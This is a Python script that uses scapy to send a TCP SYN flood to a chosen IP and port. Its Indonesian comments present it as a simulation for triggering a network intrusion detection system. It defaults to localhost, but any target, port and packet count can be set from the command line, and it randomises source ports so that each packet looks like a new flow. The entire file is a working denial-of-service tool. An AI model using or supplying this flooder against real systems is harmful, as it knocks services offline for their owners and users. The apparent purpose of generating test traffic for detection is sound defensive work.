import sys
import time
from scapy.all import IP, TCP, send
import random

def start_dos(target_ip, target_port=8000, count=1000):
    print(f"🚀 Starting SYN Flood Simulation on {target_ip}:{target_port}")
    print(f"Sending {count} packets... Press Ctrl+C to stop.")
    
    # Kita kirim paket SYN bertubi-tubi
    # Ini bakal bikin 'rate' naik dan 'state' jadi 'REQ' di NIDS
    for i in range(count):
        try:
            # Generate random source port biar dianggap flow baru terus
            sport = random.randint(1024, 65535)
            
            # Build packet
            pkt = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags="S")
            
            # Send packet (verbose=0 biar gak nyampah di terminal)
            send(pkt, verbose=0)
            
            if i % 100 == 0:
                print(f"✅ Sent {i} packets...")
                
        except KeyboardInterrupt:
            print("\n🛑 Stopped by user.")
            break
        except Exception as e:
            print(f"❌ Error: {e}")
            break

if __name__ == "__main__":
    TARGET = "127.0.0.1"
    PORT = 8000
    COUNT = 5000
    
    if len(sys.argv) > 1:
        TARGET = sys.argv[1]
    if len(sys.argv) > 2:
        PORT = int(sys.argv[2])
    if len(sys.argv) > 3:
        COUNT = int(sys.argv[3])

    start_dos(TARGET, target_port=PORT, count=COUNT)
